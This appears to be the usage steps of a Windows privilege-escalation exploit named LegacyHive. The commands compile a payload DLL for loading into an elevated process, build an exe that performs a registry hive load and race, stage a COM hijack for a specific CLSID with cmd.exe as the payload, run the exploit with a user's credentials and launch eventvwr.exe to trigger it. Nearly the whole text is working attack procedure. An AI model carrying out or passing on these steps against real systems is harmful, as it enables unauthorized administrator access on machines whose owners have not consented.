1. git clone https://github.com/seisdr/LegacyHive.git 
   cd LegacyHive

2. # Payload DLL (COM InprocServer32 — this is what gets loaded into the elevated process)
  x86_64-w64-mingw32-g++ -O2 -shared -o payload.dll com_payload_dll.cpp  -lkernel32 -ladvapi32 -lshlwapi -luuid -lole32 -loleaut32

  # LegacyHive exe (does the arbitrary hive load + race)
  x86_64-w64-mingw32-g++ -O2 -std=c++17 -DUNICODE -D_UNICODE -municode original_main.cpp -o LegacyHive_Original.exe  -lntdll -luserenv -ladvapi32 -lshell32 -lrpcrt4

3. python stage_com_hijack.py --clsid "{4991D34B-80A1-4291-83B6-3328366B9097}" --payload "C:\Windows\System32\cmd.exe" --outdir C:\stage

4. mkdir C:\stage
  copy payload.dll payload.cmd UsrClass.dat C:\stage\
  copy LegacyHive_Original.exe C:\stage\

5. cd C:\stage
  LegacyHive_Original.exe <your-username> <your-password> C:\stage\UsrClass.dat  

6. reg query HKCU\Software\Classes\CLSID\{4991D34B-80A1-4291-83B6-3328366B9097}\InprocServer32

7. eventvwr.exe

8. #Cleanup
  reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Local AppData"
